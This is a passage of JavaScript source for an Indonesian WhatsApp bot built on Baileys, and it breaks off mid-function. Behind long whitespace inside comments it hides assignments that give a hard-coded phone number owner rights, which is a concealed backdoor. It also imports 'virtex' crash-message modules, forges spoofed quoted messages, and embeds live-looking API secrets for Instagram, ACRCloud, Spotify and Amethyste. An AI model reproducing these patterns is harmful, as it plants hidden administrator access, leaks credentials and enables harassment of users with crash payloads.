const
{
WAConnection: _WAConnection,
MessageType,
Presence,
MessageOptions,
Mimetype,
WALocationMessage,
WA_MESSAGE_STUB_TYPES, 
WA_DEFAULT_EPHEMERAL,
WAMessageProto,
ProxyAgent,
ChatModification,
GroupSettingChange,
waChatKey,
mentionedJid,
processTime,
prepareMessageFromContent,
relayWAMessage
} = require("@adiwajshing/baileys")
const moment = require("moment-timezone")
const speed = require('performance-now')
const request = require('request');
const { spawn, exec, execSync } = require("child_process")
const fs = require("fs")
const axios = require("axios")
const util = require('util')
const ffmpeg = require('fluent-ffmpeg')
const { EmojiAPI } = require("emoji-api");
const { igApi, getSessionId } = require('insta-fetcher');
const ig = new igApi("51710311459%3AxVxRS0bOfDTv2X%3A23")
const emoji = new EmojiAPI()
const fetch = require('node-fetch');
const matematik = require('mathjs')
const PhoneNumber = require('awesome-phonenumber')
const gis = require('g-i-s');
const os = require('os')
const imageToBase64 = require('image-to-base64');
const yts = require( 'yt-search')
const ms = require('parse-ms')
const toMs = require('ms')
const { error } = require("qrcode-terminal")
const qrkode = require("qrcode")
const ameClient = require("amethyste-api")
const ameApi = new ameClient("1f486b04b157f12adf0b1fe0bd83c92a28ce768683871d2a390e25614150d0c8fa404fd01b82a5ebf5b82cbfa22e365e611c8501225a93d5d1e87f9f420eb91b")
const primbon = require('primbon-scraper')
const { removeBackgroundFromImageFile } = require('remove.bg')
const convert = require('imagemagick')
const ytdl = require('ytdl-core');
const Download = require("@phaticusthiccy/open-apis");
const acrcloud = require("acrcloud");
const { Brainly } = require("brainly-scraper-v2");
const brainly = new Brainly("id"); 
const Jimp = require('jimp') ;
const acr = new acrcloud({
host: "identify-eu-west-1.acrcloud.com",
access_key: "c9f2fca5e16a7986b0a6c8ff70ed0a06",
access_secret: "PQR9E04ZD60wQPgTSRRqwkBFIWEZldj0G3q7NJuR"
});

const songlyrics = require('songlyrics').default
const Spotify = require('spotifydl-core').default
const spotify = new Spotify({
clientId: 'acc6302297e040aeb6e4ac1fbdfd62c3',
clientSecret: '0e8439a1280a43aba9a5bc0a16f3f009'
})
const {
youtubeSearch,
mediafiredl, 
lyricsv2, 
lyrics, 
facebookdl, 
facebookdlv2,
tiktokdl, 
tiktokdlv2, 
twitterdl, 
twitterdlv2,
getZodiac,
liputan6,
googleIt, 
wallpaperv2, 
googleImage, 
alquran, 
jadwalTVNow, 
gempa, 
gempaNow} = require('@bochilteam/scraper')
const { SoundCloud } = require("scdl-core");
const CuteFFMPEG = require("cute-ffmpeg").CuteFFMPEG;
const FFMPEGRequest = require("cute-ffmpeg").FFMPEGRequest;
const Ffmpeg = new CuteFFMPEG({
  overwrite: true
});

// stickwm
const Exif = require('./lib/exif');
const exif = new Exif();



 //------------------ LIB FILE ------------------\\
const {parseMention, FileSize, weton,week,calender,dateIslamic,formatDate, isUrl, makeid, calculate_age, generateMessageTag, runtime, randomNomor, jsonformat, generateProfilePicture, getBuffer, h2k, generateMessageID, getGroupAdmins, getRandom, banner, start, info, success, close } = require('./lib/functions')
const { color, bgcolor } = require('./lib/color.js')
const hx = require("./lib/hxz-api")
const { fetchJson, getBase64, kyun, createExif } = require('./lib/fetcher')
const { styleText, baseURI, upload, buffer2Stream, stream2Buffer, ythd} = require('./lib/ytdl')
const afk = JSON.parse(fs.readFileSync('./lib/off.json'))
const { sleep, isAfk, cekafk, addafk } = require('./lib/offline')
const voting = JSON.parse(fs.readFileSync('./lib/voting.json'))
const { addVote, delVote } = require('./lib/vote')
const { hentong, sewabot, donasi, help, info1} = require('./message')
const { msgFilter, addSpam, unSpam, SpamExpired, cekSpam} = require('./lib/antispam')
const { uploadFile1Day, uptotele, uploadImages } = require('./lib/uploadimage') 
const { TelegraPh, UploadFileUgu } = require('./lib/uploader') 
const textpro = require('./lib/textpro')
const simple = require("./lib/simple.js");
const { wikiSearch } = require('./lib/wiki.js')
const _prem = require("./lib/premium");
const _sewa = require('./lib/sewa')
const game = require("./lib/game");
const { isTicTacToe, getPosTic } = require("./lib/tictactoe");
const tictac = require("./lib/tictac");
const { addAutoClear,autoClearChat,checkAutoClear, checkDataName, createDataId, getDataId, addDataId, removeDataId, checkDataId, checkClaim, getClaim, expiredClaim, addUserClaim, getHit, cmdAdd, expiredCmd } = require("./lib/totalcmd");
const { pinterest, wallpaper, wikimedia, quotesAnime } = require('./lib/scraper') 

const { bad, menu, tekssalah, katahai, katamalem, katasiang, katasore, katalopyou, tekscmd, teksspam, ilhamberkata, ngebucin, badud, ohayo, salam, thanks, anime} = require("./message/messages.js");
const translate = require('./lib/translate')
const {getDateId, resetLevelingXp, userXp, userLeveling, getLevelingXp, getLevelingLevel, getLevelingId, addLevelingXp, addLevelingLevel, addUserId } = require("./lib/user");
const { gethitUser, checkHit, AddHit, isLimit, limitAdd, getLimit, giveLimit, addBalance, kurangBalance, getBalance, isGame, gameAdd, givegame, cekGLimit } = require("./lib/user");



//hasil editan sendiri
const {addDb, clearAllDb, addCommands, checkCommands, deleteCommands } = require('./lib/commands')
const { addBadword, delBadword, isKasar, addCountKasar, isCountKasar, delCountKasar } = require("./lib/badword.js");
const { clearAllBan, addBanned, unBanned, cekBannedUser } = require("./lib/banned")
const { addBlock, unBlock, cekBlock } = require("./lib/blockuser");
const { addError, deleteError, checkError } = require("./lib/totalerror");
const { addblockcmd, deleteblockcmd, checkblockcmd } = require("./lib/blockcmd");
const { ucapsalamikum, enggakmau, ucapmalam, ucapsiang, ucappagi, botz, unregister, ucaphai, toxicbro, spamnih, loplop } = require("./message/ninamess");


 //------------------ VIRTEX FILE ------------------\\
//virtex by tsukasa
const { virtex, virtag, philip, emoji1, emoji2, virtex2, virtex3, virtex4, virtex5, virtex8, virtex9, virtex10, virtex11, virtex12, slayer, ngazap, virtexbytsukasa } = require('./virtex/virtex.js')
const { virtex6 } = require('./virtex/virtex6.js')
const { virtex7 } = require('./virtex/virtex7.js')
const { antivirus } = require('./virtex/antivirus.js')

           

 //------------------ JSON FILE ------------------\\
const { _scommand, commandsDB, setiker, audionye, bancht, senbadword, ban } = require("./message/jsonfile");
const { listcmdblock, welkom, settings, listerror, premium, _claim, sewa, user } = require("./message/jsonfile");
const { blocked,hitnya } = require("./message/jsonfile");
const AntiSpam = JSON.parse(fs.readFileSync('./database/antispam.json'))
const DataId = JSON.parse(fs.readFileSync('./database/data.json'))
const Dashboard = JSON.parse(fs.readFileSync('./database/dashboard.json'))


 //******************* STICKER PACK ********************\\
const { gaboleh, spam1, spam2, istigfar, hanyaadmin, jadiinadmin, ucapsalam, samasama, kumsalam } = require("./message/stickerPack.js");

 //******************* FILE PHOTO ********************\\
const virgam = fs.readFileSync('./stik/virgam.jpeg'),
 davizin = fs.readFileSync('./stik/davizinmaker.jpg'),
 girl = fs.readFileSync('./stik/trava.jpg'),
 thumb = fs.readFileSync('./stik/thumb.jpeg'),
 fakethumbnail = fs.readFileSync('./stik/fake.jpeg');



explain = settings.explain
global.Anticall = settings.Anticall
fake1 = settings.copyright
namalu = settings.namalu
publik = settings.publik
namaDocument = settings.namaDocument
ephemeral = false
totalForward = settings.totalForward
prefa = settings.setPrefix.prefix
multi = settings.setPrefix.multi
onepref  = settings.setPrefix.onepref
forwarding = settings.forwarding
nopref = settings.setPrefix.nopref
allpref = false
offline = false
autoblockcmd = settings.autoblockcmd
autobio = settings.autobio
typing= settings.typing
autoread = settings.autoread
autovn = settings.autovn
antibugtroli = settings.antitroli
nomerOwner = settings.nomerlu
nomerbot = settings.nomerbot
fake = settings.namabot
let tebakgambar = []; 
let family100 = []; 
let mtk = []; 
let tebaklirik = [];  
let siapaaku = [];
let tebakkata = [];
let tebakkimia = [];
let tebakbendera = [];
let tebakanime = [];
let caklontong = []
let caklontong1 = []
let nsfw = []
let siminya = []
waktu = '-'
alasan = '-'
let tictactoe = [];
jeda = false
gamewaktu = settings.gamewaktu
limitCount = settings.limitCount
teksChat = settings.antiPrivateChat.teksChat
chatBot = settings.antiPrivateChat.chatBot
gender = settings.gender
autosticker = settings.autosticker
autorespon = settings.autorespon 
copyright = `© ${fake1}`
Loading = settings.Loading 

autoWelcome = settings.setWelcome.autoWelcome        

AutoClearChat = settings.AutoClearChat
autoReport = true

setBc = settings.setBc
replyType = settings.setReply


jumlahTroli = settings.jumlahTroli

Qoted = settings.setQuoted
docType = "docx"
setmenu = settings.setMenu

const On =`ᴏɴ`
const Off =`ᴏғғ`
Myprofile = `ᴍʏ ᴘʀᴏғɪʟᴇ`
Mainlagi = `ᴍᴀɪɴ ʟᴀɢɪ`
const extream = ["6285156137901-1632578387@g.us","6285156137901-1633160194@g.us"]
badword = ["asu","Asu","asw","Asw","Ajg","ajg","Anjing","anjing","Bajingan","bajingan","Bjingan","bjingan","Babi","babi","Bacot","bacot","Bcot","bcot","Cacat","cacat","Jancok","jancok","Jncok","jncok","Kontol","kontol","Kntl","kntl","KONTOL","kirek","Kirek","Lonte","lonte","Lnte","lnte","Memek","memek","Mmek","mmek","Pler","pler","Silet","Silit","silit","Silet","Tai","tai","Taek","taek","coeg"]
//Masukan semua fitur ke sini, biar ke add ke dasboard
features =["igstalk","menu","ytmp4","ytmp3","play","tiktok","tiktoknowm","ig","igstory","twitter","gitclone","toimg","tomp3", "toptt","slow", "togif", "tovideo","fast", "reverse","pastebin","hode","imut","nightcore","ghost","volume","triggered","wasted","smeme","comrade","horny","blur","pixelate","simpcard","lolice","glass"] 
zenzkey = "officialdittaz"


autoLevel = settings.autoLevel    

const addCmd = (id, command) => {
    const obj = { id: id, chats: command }
    _scommand.push(obj)
    fs.writeFileSync('./database/scommand.json', JSON.stringify(_scommand))
}

const getCommandPosition = (id) => {
    let position = null
    Object.keys(_scommand).forEach((i) => {
        if (_scommand[i].id === id) {
            position = i
        }
    })
    if (position !== null) {
        return position
    }
}

const getCmd = (id) => {
    let position = null
    Object.keys(_scommand).forEach((i) => {
        if (_scommand[i].id === id) {
            position = i
        }
    })
    if (position !== null) {
        return _scommand[position].chats
    }
}

const checkSCommand = (id) => {
    let status = false
    Object.keys(_scommand).forEach((i) => {
        if (_scommand[i].id === id) {
            status = true
        }
    })
    return status
}





   


/*           Recodenya yang teliti ya sayang                                                                              */                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    Ownerin ="6285156137901@s.whatsapp.net"
/*           ntar klo error jangan salahin gua                                                               */                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             ownerNumber = [`6285156137901@s.whatsapp.net`,`${nomerOwner}@s.whatsapp.net`,`${nomerbot}@s.whatsapp.net`]
//=================================================//
module.exports = xdev = async (xdev, dev, baterai) => {
	try {
        if (!dev.hasNewMessage) return 
        dev = dev.messages.all()[0]
		if (!dev.message) return                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          
		if (dev.key && dev.key.remoteJid == 'status@broadcast') return
		const m = simple.smsg(xdev, dev);   
        dev.message = (Object.keys(dev.message)[0] === 'ephemeralMessage') ? dev.message.ephemeralMessage.message : dev.message        
        me = xdev.user
        const antibot = m.isBaileys
        const content = JSON.stringify(dev.message)
		const from = dev.key.remoteJid
		const { text, extendedText, contact, location, liveLocation, image, video, sticker, document, audio, product } = MessageType
		const type = Object.keys(dev.message)[0]        
		const time = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
		//const cmd = (type === 'conversation' && dev.message.conversation) ? dev.message.conversation : (type == 'imageMessage') && dev.message.imageMessage.caption ? dev.message.imageMessage.caption : (type == 'videoMessage') && dev.message.videoMessage.caption ? dev.message.videoMessage.caption : (type == 'extendedTextMessage') && dev.message.extendedTextMessage.text ? dev.message.extendedTextMessage.text : (type == 'stickerMessage') && (getCmd(dev.message.stickerMessage.fileSha256.toString('base64')) !== null && getCmd(dev.message.stickerMessage.fileSha256.toString('base64')) !== undefined) ? getCmd(dev.message.stickerMessage.fileSha256.toString('base64')) : "".slice(1).trim().split(/ +/).shift().toLowerCase()
		const cmd =    (type === 'conversation' && dev.message.conversation) ? dev.message.conversation : (type == 'imageMessage') && dev.message.imageMessage.caption ? dev.message.imageMessage.caption : (type == 'videoMessage') && dev.message.videoMessage.caption ? dev.message.videoMessage.caption : (type == 'extendedTextMessage') && dev.message.extendedTextMessage.text ? dev.message.extendedTextMessage.text : (type == 'stickerMessage') && (getCmd(dev.message.stickerMessage.fileSha256.toString('hex'))         !== null && getCmd(dev.message.stickerMessage.fileSha256.toString('base64')) !== undefined) ? getCmd(dev.message.stickerMessage.fileSha256.toString('base64')) : "".slice(1).trim().split(/ +/).shift().toLowerCase()
        var pes = (type === 'conversation' && dev.message.conversation) ? dev.message.conversation : (type == 'imageMessage') && dev.message.imageMessage.caption ? dev.message.imageMessage.caption : (type == 'videoMessage') && dev.message.videoMessage.caption ? dev.message.videoMessage.caption : (type == 'extendedTextMessage') && dev.message.extendedTextMessage.text ? dev.message.extendedTextMessage.text : ''
        const messagesD = pes.slice(0).trim().split(/ +/).shift().toLowerCase()
        const messagesC = pes.slice(0).trim()
       
    
      if (multi){
	  var prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><`™©®Δ^βα¦|/\\©^]/.test(cmd) ? cmd.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!`™©®Δ^βα¦|/\\©^]/gi) : '.'
	  var thePrefix = "Multi Prefix"
      } else if (nopref){
      var  prefix = ''
      var thePrefix ="No prefix"
      } else if (allpref){
      var prefix = /^[°zZ#$@*+,.?=''():√%!¢£¥€π¤ΠΦ_&><`™©®Δ^βα~¦|/\\©^]/.test(cmd) ? cmd.match(/^[°zZ#$@*+,.?=''():√%¢£¥€π¤ΠΦ_&><!`™©®Δ^βα~¦|/\\©^]/gi) : ''
      var thePrefix ="All Prefix"
      } else {
      prefix = prefa
      var thePrefix = prefa
      }
        
        //const body = (type === 'conversation' && dev.message.conversation.startsWith(prefix)) ? dev.message.conversation : (type == 'imageMessage') && dev.message[type].caption.startsWith(prefix) ? dev.message[type].caption : (type == 'videoMessage') && dev.message[type].caption.startsWith(prefix) ? dev.message[type].caption : (type == 'extendedTextMessage') && dev.message[type].text.startsWith(prefix) ? dev.message[type].text : (type == 'listResponseMessage') && dev.message[type].singleSelectReply.selectedRowId ? dev.message[type].singleSelectReply.selectedRowId : (type == 'buttonsResponseMessage') && dev.message[type].selectedButtonId ? dev.message[type].selectedButtonId : (type == 'stickerMessage') && (getCmd(dev.message[type].fileSha256.toString('base64')) !== null && getCmd(dev.message[type].fileSha256.toString('base64')) !== undefined) ? getCmd(dev.message[type].fileSha256.toString('base64')) : ""
        const body = (type === 'listResponseMessage' && dev.message.listResponseMessage.title) ? dev.message.listResponseMessage.title : (type === 'buttonsResponseMessage' && dev.message.buttonsResponseMessage.selectedButtonId) ? dev.message.buttonsResponseMessage.selectedButtonId : (type === 'conversation' && dev.message.conversation.startsWith(prefix)) ? dev.message.conversation : (type == 'imageMessage') && dev.message.imageMessage.caption.startsWith(prefix) ? dev.message.imageMessage.caption : (type == 'videoMessage') && dev.message.videoMessage.caption.startsWith(prefix) ? dev.message.videoMessage.caption : (type == 'extendedTextMessage') && dev.message.extendedTextMessage.text.startsWith(prefix) ? dev.message.extendedTextMessage.text : (type == 'stickerMessage') && (getCmd(dev.message.stickerMessage.fileSha256.toString('base64')) !== null && getCmd(dev.message.stickerMessage.fileSha256.toString('base64')) !== undefined) ? getCmd(dev.message.stickerMessage.fileSha256.toString('base64')) : ""
		const budy = (type === 'conversation') ? dev.message.conversation : (type === 'extendedTextMessage') ? dev.message.extendedTextMessage.text : ''
        const selectedButton = (type == 'buttonsResponseMessage') ? dev.message.buttonsResponseMessage.selectedButtonId : ''
        const responseButton = (type == 'listResponseMessage') ? dev.message.listResponseMessage.title : ''                        
		const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
		const args = body.trim().split(/ +/).slice(1)
		const isCmd = body.startsWith(prefix)
		const q = args.join(' ')
        const c = args.join(" ")
		const timeWib = moment().tz('Asia/Jakarta').format('HH:mm:ss')
		const timeWit= moment().tz('Asia/Makassar').format('HH:mm:ss')
        const timeWita = moment().tz('Asia/Jayapura').format('HH:mm:ss')
		const botNumber = xdev.user.jid
		const botNumberss = xdev.user.jid + '@c.us'
		const isGroup = from.endsWith('@g.us')
		const sender = dev.key.fromMe ? xdev.user.jid : isGroup ? dev.participant : dev.key.remoteJid
		const senderNumber = sender.split("@")[0] 
		const isOwner = ownerNumber.includes(sender)
		const theOwner = sender == Ownerin
		const totalchat = await xdev.chats.all()
		const groupMetadata = isGroup ? await xdev.groupMetadata(from) : ''
		const groupName = isGroup ? groupMetadata.subject : ''
		const groupId = isGroup ? groupMetadata.jid : ''
		const groupMembers = isGroup ? groupMetadata.participants : ''
		const groupDesc = isGroup ? groupMetadata.desc : ''
		const groupOwner = isGroup ? groupMetadata.owner : ''
		const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
        const conts = dev.key.fromMe ? xdev.user.jid : xdev.contacts[sender] || { notify: jid.replace(/@.+/, '') }
        const pushname = dev.key.fromMe ? xdev.user.name : conts.notify || conts.vname || conts.name || '-'
        chatss = (type === 'conversation') ? dev.message.conversation : (type === 'extendedTextMessage') ? dev.message.extendedTextMessage.text : ''
        const forward = { forwardingScore: totalForward, isForwarded: forwarding, sendEphemeral: ephemeral}
        
   
        const isHit = checkHit(senderNumber, user)   
        const timestampp = speed();
	    const latensi = speed() - timestampp
        const arg = budy.slice(command.length + 2, budy.length)
        const atibot = dev.isBaileys
        const gcounti = settings.gcount
        const itsMe = dev.key.fromMe
        const mentionByTag = type == "extendedTextMessage" && dev.message.extendedTextMessage.contextInfo != null ? dev.message.extendedTextMessage.contextInfo.mentionedJid : []
        const mentionByReply = type == "extendedTextMessage" && dev.message.extendedTextMessage.contextInfo != null ? dev.message.extendedTextMessage.contextInfo.participant || "" : ""
 
//User 
const userLevel = getLevelingLevel(senderNumber, user)
const userExp = getLevelingXp(senderNumber, user)
const userId = getLevelingId(senderNumber, user)
const amountExp = Math.floor(Math.random() * 10) + 50
const requiredExp = 1000 * userLevel
const userPersen = userExp/requiredExp*100
const userVerified = getDateId(senderNumber, user)
   
//VN saat ada yg maggil bot
const iyakak = botz[Math.floor(Math.random() * botz.length)]              
const ucapbot = fs.readFileSync(iyakak)

//Vn saat command tidak ditemukan
const unreg = unregister[Math.floor(Math.random() * unregister.length)]              
const gakada = fs.readFileSync(unreg)

//VN saat ada yang toxic
const anying = toxicbro[Math.floor(Math.random() * toxicbro.length)]              
const astaga = fs.readFileSync(anying)

//VN saat ada yg akses fitur owner
const ahenggak = enggakmau[Math.floor(Math.random() * enggakmau.length)]              
const gakmau = fs.readFileSync(ahenggak)

//VN saat ada yg bilang selamat pagi
const ay = ucappagi[Math.floor(Math.random() * ucappagi.length)]
const oahyo = fs.readFileSync(ay)

//VN saat ada yg bilang selamat malam
const ayuk = ucapmalam[Math.floor(Math.random() * ucapmalam.length)]
const oyasumi = fs.readFileSync(ayuk)

//VN saat ada yg bilang selamat siang
const yayuk = ucapsiang[Math.floor(Math.random() * ucapsiang.length)]
const koniciwa = fs.readFileSync(yayuk)

//VN saat ada yg spam
const alal = spamnih[Math.floor(Math.random() * spamnih.length)]
const nospam = fs.readFileSync(alal)

//VN saat ada yg bilang halo
const ulul = ucaphai[Math.floor(Math.random() * ucaphai.length)]
const moshimos = fs.readFileSync(ulul)

//VN saat ada yg bilang asalamualaikum
const alul = ucapsalamikum[Math.floor(Math.random() * ucapsalamikum.length)]
const walaikumsalam = fs.readFileSync(alul)

//VN saat ada yg bilang i love u
const awlu = loplop[Math.floor(Math.random() * loplop.length)]
const lopyoutoo = fs.readFileSync(awlu)

//Random nama anime
const karakter = anime[Math.floor(Math.random() * anime.length)]

//Teks untuk pertanyaan game yg salah
const jawabansalah = tekssalah[Math.floor(Math.random() * tekssalah.length)]
           
const textcmd = tekscmd[Math.floor(Math.random() * tekscmd.length)]                         
const textspam = teksspam[Math.floor(Math.random() * teksspam.length)]                         

 
//Security / Keamanan
const Toxic = checkDataId ("antibadword", from, DataId) 
const isBanchat = checkDataId ("banchat", from, DataId) 
const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
const isGroupAdmins = groupAdmins.includes(sender) || false
const isVote = isGroup ? voting.includes(from) : false
const isAntiLink = checkDataId ("antilink", from, DataId) 
const AntiVirtex = checkDataId ("antivirtex", from, DataId) 
const isAntilinkGc = checkDataId ("antilinkgc", from, DataId) 
const isAntihidetag = checkDataId ("antihidetag", from, DataId) 
const isAntiviewonce = checkDataId ("antivo", from, DataId) 
const isKickarea = checkDataId ("antiasing", from, DataId) 
const isWelkom = isGroup ? JSON.parse(fs.readFileSync('./database/welkom.json')).includes(from) : false
const isExtream = isGroup ? extream.includes(from) : false
const isSimi = isGroup ? siminya.includes(from) : false
const isAntidel = isGroup ? xdev.antidel.includes(from) : false
const isPremium = isOwner ? true : _prem.checkPremiumUser(sender, premium)
const gcount = isPremium ? gcounti.prem : gcounti.user

//Auto READ   
if(autoread){
xdev.chatRead(from, "read").catch(_ => _)
}

//-------------------- 》MESSGAGE RESPON《 --------------------\\
 
if(senderNumber.startsWith("62")){
var mess = {
wait: 'Tunggu sebentar ya kak',
search: 'Searching...',
scrap: '*Scrapping...*',
success: 'Berhasil!',
limit: `[❕] Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`,
claimOn: `Kamu sudah melakukan claim sebelumnya, Harap claim lagi pada jam ${getClaim(senderNumber, _claim)}.`,
wrongFormat: 'Format salah, coba liat lagi di menu',

error: {
stick: 'bukan sticker itu:v',
api: 'Error api atau linkya mungkin',
Iv: 'Linknya error:v',
link : "Link error!"
},

block:{
Bowner: `Maaf kak command ${command} telah di block oleh owner`,
Bsystem: `Command ${command} telah di block oleh system karena terjadi error`
},

 only: {
prem : 'Premium special features! Chat owner to get Premium access!',
group: 'Fitur ini dapat digunakan di Dalam Group!',
ownerB: 'Fitur Khusus Owner Bot!',
admin: 'Fitur dapat Digunakan oleh Admin Group!',
Badmin: 'Fitur dapat Digunakan Setelah Bot menjadi ADMIN!'
 }
 }

} else {
	
//BAHASA ENGLISH
var mess = {
wait: 'Please Wait a second',
search: 'Searching...',
scrap: 'Scrapping...',
success: 'Success!',
limit: `[❕] your limit has run out, please type ${prefix}limit for check your limit`,
eror: 'There somethings wrong\nPlease try again later or contact to the developer',
claimOn: `You have made a claim before, Please claim again at hours ${getClaim(senderNumber, _claim)}.`,
wrongFormat: 'Format is wrong',

error: {
stick: 'That is not sticker :v',
api: 'Error api atau linkya mungkin',
Iv: 'Linknya error:v',
link : "Link error!"
},

block:{
Bowner: `Sorry, the command「 *${command}* 」has been blocked by the owner`,
Bsystem: `Sorry, the command「 *${command}* 」has been blocked by the system due to an error`
},

only: {
prem : 'Premium special features! Chat owner to get Premium access!',
group: 'This features can be used in the group!',
ownerB: 'This feature can be used only for bot owner!',
admin: 'This feature can be used only for group admin!',
Badmin: 'This feature can be used after the bot becomes admin!'
 }
 }


}            

//-------------------- 》AKHIR MESSGAGE RESPON《 --------------------\\



//Ucapan Waktu  
if(timeWib < "23:59:00"){ var ucapanWaktu = 'Selamat malam' }
if(timeWib < "19:00:00"){ var ucapanWaktu = 'Selamat malam'}
if(timeWib < "18:00:00"){ var ucapanWaktu = 'Selamat sore'}
if(timeWib < "15:00:00"){ var ucapanWaktu = 'Selamat siang'}
if(timeWib < "11:00:00"){ var ucapanWaktu = 'Selamat pagi'}
if(timeWib < "06:00:00"){ var ucapanWaktu = 'Selamat pagi'  }      
        
//FAKE REPLY  
const ftoko = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: {"productMessage": {"product": {"productImage":{"mimetype": "image/jpeg","jpegThumbnail": fs.readFileSync(`./stik/fake.jpeg`)},"title": `${pushname}`,"description": `${ucapanWaktu} kak`,"currencyCode": "IDR", "priceAmount1000": `${getBalance(senderNumber, user)}`, "retailerId": `Rp10`,"productImageCount": 1},"businessOwnerJid": `0@s.whatsapp.net`}}}
const fkontak = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: `0@s.whatsapp.net` } : {}) }, message: { 'contactMessage': { 'displayName': `${pushname}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${pushname},;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': fs.readFileSync('./stik/thumb.jpeg')}}}
const ftext = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${fake}`,"title": `Hmm`,'jpegThumbnail': fs.readFileSync('./stik/fake.jpeg')}}}
const ftroli = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: {orderMessage: {itemCount : jumlahTroli, status: 1,surface : 2,message: `${fake}\n${ucapanWaktu} kak`,orderTitle: `${ucapanWaktu} kak`,thumbnail: fs.readFileSync('./stik/thumb.jpeg'), sellerJid: `0@s.whatsapp.net`}}}
const fsticker = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},"message": {"stickerMessage": { "url": "https://mmg.whatsapp.net/d/f/Am6FBfNf-E2f1VoGBXkPaNAy7L6Tw_HMavKrHEt48QM4.enc","fileSha256": "Yfj8SW7liSEnDakvyVlXVZQ1LJBC9idn09X7KHe8HTc=","fileEncSha256": "F854aUrzgAkBTOVULpne4oSIi6S04Jo56pjZEo+p+9U=","mediaKey": "Z3nA2asclAAwWHngNO/vJ81qxOE2/0gkEnXak+NxPV4=","mimetype": "image/webp","height": 64,"width": 64,"directPath": "/v/t62.15575-24/12097272_1193895144391295_8973688483514349023_n.enc?ccb=11-4&oh=5a9d7147627a8355569f1a641b9ebee3&oe=60C65E73","fileLength": "7186","mediaKeyTimestamp": "1622815545","isAnimated": false}}}
const fvn = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "audioMessage": {"mimetype":"audio/ogg; codecs=opus","seconds": "9999999","ptt": "true"}}}
const floc = { key: {"fromMe": false,"participant": `0@s.whatsapp.net`, "remoteJid": "6289530863358-1621036495@g.us" },message: { "liveLocationMessage": { "title":`${fake}`,}}}
const fvideo = { key: {fromMe: false,participant: `62895619083555@s.whatsapp.net`, ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {}) },message: { "videoMessage": { "title":"hallo bang","h": `Hmm`,'seconds': '-99999', 'caption': `${fake}`,'jpegThumbnail': fs.readFileSync('./stik/thumb.jpeg')}}}
const fgc = { key: {"fromMe": false,"participant": "0@s.whatsapp.net","remoteJid": "0@s.whatsapp.net"},"message": {"groupInviteMessage": {"groupJid": "62895619083555-1616169743@g.us","inviteCode": "mememteeeekkeke","groupName": "P", "caption": `${fake}`, 'jpegThumbnail': fs.readFileSync('./stik/thumb.jpeg')}}}
const fgif = { key: {fromMe: false,participant: `6285842369183@s.whatsapp.net`, ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {}) },message: { "videoMessage": { "title":"hallo bang","h": `Hmm`,'seconds': '99999', 'gifPlayback': 'true', 'caption': `${fake}`,'jpegThumbnail': fs.readFileSync('./stik/thumb.jpeg')}}} 
const fimage = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: {"imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": fake, "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('./stik/thumb.jpeg'), "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="}}}
                


//Set Quoted
if(Qoted === "ftoko"){
var setQuoted = ftoko
} else if(Qoted === "fkontak"){
var setQuoted = fkontak
} else if(Qoted === "ftext"){
var setQuoted = ftext
}else if(Qoted === "ftroli"){
var setQuoted = ftroli
} else if(Qoted === "fsticker"){
var setQuoted = fsticker
} else if(Qoted === "fvn"){
var setQuoted = fvn
} else if(Qoted === "floc"){
var setQuoted = floc
}else if(Qoted === "fvideo"){
var setQuoted = fvideo
} else if(Qoted === "fgc"){
var setQuoted = fgc
} else if(Qoted === "fgif"){
var setQuoted = fgif
} else if(Qoted === "fimage"){
var setQuoted = fimage
} else if(Qoted === "dev"){
var setQuoted = dev
}



//SetReply
const setReply = async(teks) =>{
if(replyType === "web"){
xdev.sendMessage(from, teks, text, { quoted: dev, contextInfo: { forward, externalAdReply:{title: `${fake}`,body:`${week} ${calender}`,previewType:"PHOTO",thumbnail: fs.readFileSync('./stik/reply.jpg'), sourceUrl:`http://wa.me/${Ownerin.split("@")[0]}`}}})
} else if(replyType === "troli"){
var yakult = xdev.prepareMessageFromContent(from, {
'orderMessage': {
